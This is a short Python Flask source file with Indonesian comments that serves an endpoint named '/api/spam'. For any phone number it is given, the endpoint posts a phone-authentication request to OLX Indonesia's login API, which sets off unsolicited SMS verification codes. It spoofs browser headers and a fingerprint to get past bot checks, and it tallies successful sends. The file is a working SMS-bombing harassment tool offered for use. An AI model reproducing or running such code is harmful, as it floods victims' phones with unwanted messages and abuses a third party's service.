#!/bin/python

# simpel flask api
# author : polygon

from flask import Flask, request, render_template, jsonify, abort
from flask_cors import CORS
from flask_restful import Resource, Api
import requests as req
import json
from fake_useragent import UserAgent

# fake user agent
ua_sys = UserAgent()
ua = ua_sys.random

# hitung berhasil dan gagal
berhasil=0
gagal=0

# mendfinisikan flask
app = Flask(__name__)
api = Api(app)
CORS(app)

@app.route("/",methods=['POST','GET'])
def home():
    return render_template("index.html")

class spam(Resource):
    def post(self):
        global berhasil,gagal
        if request.method == 'POST':
            nomer=request.args.get("phone")
            if not nomer:
                return jsonify({"result":"gagal"})
            
            respon = req.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType":"phone","phone":"" + nomer,"language":"id"}),headers={"Host":"www.olx.co.id","x-newrelic-id":"VQMGU1ZVDxABU1lbBgMDUlI=","origin":"https://www.olx.co.id","x-panamera-fingerprint":"e01600dd8c6a82fa2dff1ec15164a252#1638175525174","user-agent":ua,"content-type":"application/json","accept":"*/*","referer":"https://www.olx.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
            if "PENDING" in respon:
                berhasil+=1
            else:
                gagal+=1
        
            return jsonify({"result":"send","berhasil": berhasil,"gagal": gagal})

    def get(self):
        return(
            jsonify(
                {
                    "msg":"methods should be POST (Method harus post)",
                    "status": 405
                }
            )
        )


api.add_resource(spam, "/api/spam")
app.run(debug=True, host="0.0.0.0", port="3000")
